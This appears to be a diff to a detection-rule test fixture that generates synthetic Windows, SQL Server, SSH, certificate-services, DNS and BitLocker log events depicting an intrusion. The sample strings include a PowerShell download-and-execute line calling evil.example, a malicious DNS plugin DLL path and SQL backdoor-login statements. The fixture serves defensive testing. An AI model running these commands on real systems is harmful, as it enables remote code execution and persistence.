@@ -21,6 +21,11 @@ SEC = ("Microsoft-Windows-Security-Auditing", "Security")
 SYSMON = ("Microsoft-Windows-Sysmon", "Microsoft-Windows-Sysmon/Operational")
 PS = ("Microsoft-Windows-PowerShell", "Microsoft-Windows-PowerShell/Operational")
 SCM = ("Service Control Manager", "System")
+MSSQL = ("MSSQL$PROD", "Application")
+SSHD = ("OpenSSH", "OpenSSH/Operational")
+KDC = ("Microsoft-Windows-Kerberos-Key-Distribution-Center", "System")
+DNS_AUDIT = ("Microsoft-Windows-DNSServer", "Microsoft-Windows-DNSServer/Audit")
+BITLOCKER = ("Microsoft-Windows-BitLocker-API", "Microsoft-Windows-BitLocker/BitLocker Management")
 # reference times (UTC). Business hours in the tests: 08-19 Europe/Paris, weekend Sat/Sun.
 DAY = 1788300000000  # 2026-09-01 (Tuesday) 21:20 UTC
 T_WORK = 1788255000000  # 2026-09-01 08:50 UTC = 10:50 Paris
@@ -135,6 +140,13 @@ def sysmon(event_id: int, data: dict[str, Any], ts: int = T_WORK) -> dict[str, A
     return ev(event_id, SYSMON, base, ts)
 
 
+def sql_audit(action: str, klass: str, fields: dict[str, str], ts: int) -> dict[str, Any]:
+    """A SQL Server audit record (33205): the whole record as name:value lines in one string."""
+    record = {"audit_schema_version": "1", "action_id": action, "succeeded": "true", "class_type": klass, "server_principal_name": "CORP\\dba1"}
+    record.update(fields)
+    return ev(33205, MSSQL, {"Data": "\n".join(f"{k}:{v}" for k, v in record.items())}, ts, computer="SQL01")
+
+
 def build() -> list[dict[str, Any]]:
     """A small host scenario touching most bundled Windows rules: a brute force that succeeds, an
     off-hours admin logon, a weekend service-account logon, download and execution tooling, a
@@ -212,6 +224,62 @@ def build() -> list[dict[str, Any]]:
     )
     rows.append(ev(4720, SEC, {"TargetUserName": "backdoor", "SubjectUserName": "alice", "SubjectDomainName": "CORP"}, ts=t + 130_000))
     rows.append(ev(4732, SEC, {"MemberName": "CN=backdoor,CN=Users,DC=corp", "TargetUserName": "Administrators", "SubjectUserName": "alice"}, ts=t + 131_000))
+    # server products: SQL Server, OpenSSH, Certificate Services, the DNS server, BitLocker
+    sq = t + 150_000
+    rows.append(
+        sql_audit(
+            "APRL",
+            "SG",
+            {"target_server_principal_name": "backdoor", "object_name": "sysadmin", "statement": "ALTER SERVER ROLE [sysadmin] ADD MEMBER [backdoor]"},
+            sq,
+        )
+    )
+    rows.append(
+        sql_audit(
+            "APRL",
+            "RL",
+            {"target_database_principal_name": "backdoor", "object_name": "db_owner", "statement": "ALTER ROLE [db_owner] ADD MEMBER [backdoor]"},
+            sq + 1000,
+        )
+    )
+    rows.append(sql_audit("CR", "SL", {"object_name": "backdoor", "statement": "CREATE LOGIN [backdoor] WITH PASSWORD=N'******'"}, sq + 2000))
+    rows.append(sql_audit("LGEA", "SL", {"object_name": "sa", "statement": "ALTER LOGIN [sa] ENABLE"}, sq + 3000))
+    rows.append(sql_audit("DR", "SA", {"object_name": "server-audit-spec", "statement": "DROP SERVER AUDIT SPECIFICATION [server-audit-spec]"}, sq + 4000))
+    for i, login in enumerate(["sa", "admin", "sa", "root", "sa"]):
+        reason = f"Login failed for user '{login}'. Reason: Password did not match that for the login provided. [CLIENT: 203.0.113.12]"
+        info = "<action_info><address>203.0.113.12</address></action_info>"
+        rows.append(
+            sql_audit(
+                "LGIF",
+                "LX",
+                {"succeeded": "false", "server_principal_name": login, "statement": reason, "additional_information": info},
+                sq + 10_000 + i * 2000,
+            )
+        )
+    rows.append(ev(15457, MSSQL, {"Data": ["xp_cmdshell", "0", "1"]}, sq + 30_000, computer="SQL01"))
+    rows.append(ev(17115, MSSQL, {"Data": '\r\n\t -s "PROD"\r\n\t -m'}, sq + 31_000, computer="SQL01"))
+    for i in range(5):
+        rows.append(
+            ev(4, SSHD, {"process": "sshd", "payload": f"Invalid user user{i} from 203.0.113.13 port {50000 + i}"}, sq + 40_000 + i * 1000, computer="FS01")
+        )
+    ca = {"SubjectUserSid": "S-1-5-21-1-2-3-1104", "SubjectUserName": "alice", "SubjectDomainName": "CORP", "SubjectLogonId": "0x3e7"}
+    attrs = "CertificateTemplate:ESC1_User\nSAN:upn=administrator@corp.local"
+    rows.append(
+        ev(4886, SEC, {"RequestId": "12", "Requester": "CORP\\alice", "Attributes": attrs, "CertificateTemplate": "ESC1_User"}, sq + 50_000, computer="PKI01")
+    )
+    rows.append(ev(4882, SEC, {**ca, "SecuritySettings": "Allow(0x00000003)\tCORP\\alice\n\tCA Administrator"}, sq + 51_000, computer="PKI01"))
+    rows.append(ev(4899, SEC, {**ca, "TemplateInternalName": "ESC1_User"}, sq + 52_000, computer="PKI01"))
+    rows.append(ev(4885, SEC, {**ca, "AuditFilter": "0"}, sq + 53_000, computer="PKI01"))
+    rows.append(ev(4876, SEC, {**ca, "BackupType": "1"}, sq + 54_000, computer="PKI01"))
+    rows.append(ev(39, KDC, {"AccountName": "administrator", "Subject": "CN=alice", "Issuer": "corp-ca"}, sq + 55_000, computer="DC01"))
+    rows.append(
+        ev(541, DNS_AUDIT, {"Setting": "ServerLevelPluginDll", "Scope": ".", "NewValue": "\\\\203.0.113.14\\share\\p.dll"}, sq + 56_000, computer="DC01")
+    )
+    rows.append(ev(541, DNS_AUDIT, {"Setting": "EventLogLevel", "Scope": ".", "NewValue": "0"}, sq + 57_000, computer="DC01"))
+    rows.append(ev(515, DNS_AUDIT, {"Type": 1, "NAME": "*.corp.local", "TTL": 3600, "Zone": "corp.local"}, sq + 58_000, computer="DC01"))
+    bl = {"VolumeName": "\\\\?\\Volume{1}", "VolumeMountPoint": "C:"}
+    rows.append(ev(775, BITLOCKER, {**bl, "ProtectorType": "0x8"}, sq + 60_000))
+    rows.append(ev(768, BITLOCKER, {**bl, "AlgorithmType": 32772}, sq + 61_000))
     rows.append(ev(4104, PS, {"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p.ps1')", "Path": ""}, ts=t + 140_000))
     return rows
 
